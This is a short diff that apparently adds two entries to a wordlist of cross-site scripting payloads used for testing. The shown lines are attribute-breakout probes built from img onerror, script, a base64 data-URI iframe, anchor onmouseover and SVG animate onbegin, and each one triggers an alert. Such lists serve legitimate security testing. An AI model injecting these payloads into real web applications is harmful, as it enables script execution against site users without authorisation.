@@ -5,3 +5,5 @@
 "><img src=x onerror=alert(1)>
 "><script>alert(document.domain)</script>
 "><iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+"><a onmouseover=alert(1) style=display:block>XSS</a>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
